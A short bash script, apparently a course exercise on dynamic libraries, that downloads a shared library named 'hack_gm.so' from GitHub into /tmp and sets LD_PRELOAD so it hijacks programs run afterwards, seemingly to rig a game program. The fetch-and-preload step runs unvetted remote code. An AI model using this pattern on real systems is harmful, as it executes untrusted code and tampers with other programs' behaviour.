#!/bin/bash
wget -O /tmp/hack_gm.so https://github.com/nhamidn/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hack_gm.so
export LD_PRELOAD=/tmp/hack_gm.so
